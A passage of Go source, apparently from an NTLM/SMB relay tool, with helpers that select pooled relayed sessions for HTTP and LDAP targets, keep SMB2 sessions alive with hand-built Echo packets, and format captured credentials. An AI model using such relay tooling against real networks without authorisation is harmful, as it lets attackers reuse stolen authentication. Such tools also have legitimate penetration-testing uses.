		return cfg.SelectPoolEntry(http, remote)
	}
}

// resolveLDAPUpstream returns a Resolve callback for LDAPPassthrough.
func (rs *RelayServer) resolveLDAPUpstream(remote net.Addr) func(target string) *pooledSession {
	cfg := &rs.Config
	return func(target string) *pooledSession {
		candidates := rs.pool.FindMatches(target, "")
		if len(candidates) == 0 {
			return nil
		}
		ldap := candidates[:0]
		for _, p := range candidates {
			if p.IsLDAP() && !p.IsDead() {
				ldap = append(ldap, p)
			}
		}
		if len(ldap) == 0 {
			return nil
		}
		return cfg.SelectPoolEntry(ldap, remote)
	}
}

// markUsed records the last-used timestamp for a target (used by HTTP listener).
func (rs *RelayServer) markUsed(target string, when time.Time) {
	rs.mu.Lock()
	rs.lastUsed[target] = when
	rs.mu.Unlock()
}

// probeUpstream sends an SMB2 Echo over ps and returns true if the upstream
// answered with STATUS_OK. A marshal failure (which is an internal bug, not
// an upstream-health signal) is logged at Errorf and treated as a probe miss
// so the caller can evict; we don't want to silently conflate the two.
func probeUpstream(ps *pooledSession) bool {
	pkt, err := buildEchoRequest(ps.Conn.UpstreamSessionID())
	if err != nil {
		log.Errorf("buildEchoRequest: %v", err)
		return false
	}
	ps.mu.Lock()
	resp, err := ps.Conn.SendRawPDU(pkt)
	ps.mu.Unlock()
	if err != nil || len(resp) < 12 {
		return false
	}
	status := binary.LittleEndian.Uint32(resp[8:12])
	return status == smb.StatusOk
}

// buildEchoRequest assembles a minimal SMB2 Echo PDU.
func buildEchoRequest(sessionID uint64) ([]byte, error) {
	h := smb.Header{
		ProtocolID:    []byte(smb.ProtocolSmb2),
		StructureSize: 64,
		CreditCharge:  1,
		Command:       smb.CommandEcho,
		Credits:       1,
		SessionID:     sessionID,
		Signature:     make([]byte, 16),
	}
	buf, err := encoder.Marshal(h)
	if err != nil {
		return nil, fmt.Errorf("marshal Echo header: %w", err)
	}
	return append(buf, 4, 0, 0, 0), nil
}

func authUserFromCred(cred *Credential) string {
	if cred == nil {
		return ""
	}
	if cred.Domain == "" {
		return cred.Username
	}
	return cred.Domain + "\\" + cred.Username
}
